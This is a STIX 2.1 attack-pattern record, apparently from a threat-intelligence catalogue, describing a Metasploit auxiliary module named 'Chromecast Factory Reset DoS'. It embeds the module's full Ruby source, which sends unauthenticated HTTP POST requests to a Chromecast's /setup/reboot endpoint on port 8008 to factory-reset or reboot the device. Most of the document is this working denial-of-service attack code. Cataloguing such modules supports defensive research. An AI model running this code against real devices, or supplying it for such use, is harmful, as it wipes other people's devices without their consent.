{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9ee1eebf-0451-460f-aca2-c5e1628809e6",
    "created": "2024-08-14T16:22:57.171544Z",
    "modified": "2024-08-14T16:22:57.171548Z",
    "name": "Chromecast Factory Reset DoS",
    "description": " This module performs a factory reset on a Chromecast, causing a denial of service (DoS). No user authentication is required. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/chromecast/chromecast_reset.rb",
            "external_id": "chromecast_reset.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.google.com/intl/en/chrome/devices/chromecast/index.html#vendorwebsite"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Chromecast Factory Reset DoS',\n      'Description' => %q{\n        This module performs a factory reset on a Chromecast, causing a denial of service (DoS).\n        No user authentication is required.\n      },\n      'Author' => ['wvu'],\n      'References' => [\n        ['URL', 'http://www.google.com/intl/en/chrome/devices/chromecast/index.html'] # vendor website\n      ],\n      'License' => MSF_LICENSE,\n      'Actions' => [\n        ['Reset', 'Description' => 'Factory reset'],\n        ['Reboot', 'Description' => 'Reboot only']\n      ],\n      'DefaultAction' => 'Reset'\n    ))\n\n    register_options([\n      Opt::RPORT(8008)\n    ])\n  end\n\n  def run\n    case action.name\n    when 'Reset'\n      res = reset\n    when 'Reboot'\n      res = reboot\n    end\n\n    if res && res.code == 200\n      print_good(\"#{action.name} performed\")\n    elsif res\n      print_error(\"An error occurred: #{res.code} #{res.message}\")\n    end\n  end\n\n  def reset\n    begin\n      send_request_raw(\n        'method' => 'POST',\n        'uri' => '/setup/reboot',\n        'agent' => Rex::Text.rand_text_english(rand(42) + 1),\n        'ctype' => 'application/json',\n        'data' => '{\"params\": \"fdr\"}'\n      )\n    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,\n           Rex::HostUnreachable => e\n      fail_with(Failure::Unreachable, e)\n    ensure\n      disconnect\n    end\n  end\n\n  def reboot\n    begin\n      send_request_raw(\n        'method' => 'POST',\n        'uri' => '/setup/reboot',\n        'agent' => Rex::Text.rand_text_english(rand(42) + 1),\n        'ctype' => 'application/json',\n        'data' => '{\"params\": \"now\"}'\n      )\n    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,\n           Rex::HostUnreachable => e\n      fail_with(Failure::Unreachable, e)\n    ensure\n      disconnect\n    end\n  end\nend\n"
}